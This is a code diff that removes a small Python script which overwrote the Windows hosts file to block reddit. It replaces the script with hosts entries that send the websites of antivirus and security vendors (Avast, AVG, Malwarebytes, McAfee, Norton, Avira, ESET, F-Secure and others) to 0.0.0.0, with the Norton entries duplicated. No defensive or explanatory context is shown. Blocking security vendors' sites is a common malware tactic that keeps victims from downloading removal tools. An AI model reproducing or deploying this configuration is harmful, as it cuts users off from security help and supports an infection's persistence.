@@ -1,7 +1,20 @@
-filepath = r"C:\Windows\System32\drivers\etc\hosts"
-
-# open the file in write mode
-with open(filepath, "w") as file:
-    # write new content to the file
-    file.write("0.0.0.0\t\treddit.com\n")
-    file.write("0.0.0.0\t\twww.reddit.com\n")
+0.0.0.0		www.avast.com
+0.0.0.0		avast.com
+0.0.0.0		www.avg.com
+0.0.0.0		avg.com
+0.0.0.0		www.malwarebytes.com
+0.0.0.0		malwarebytes.com
+0.0.0.0		www.mcafee.com
+0.0.0.0		mcafee.com
+0.0.0.0		us.norton.com
+0.0.0.0		norton.com
+0.0.0.0		www.avira.com
+0.0.0.0		avira.com
+0.0.0.0		www.cynet.com
+0.0.0.0		cynet.com
+0.0.0.0		www.eset.com
+0.0.0.0		eset.com
+0.0.0.0		www.f-secure.com
+0.0.0.0		f-secure.com
+0.0.0.0		us.norton.com
+0.0.0.0		norton.com
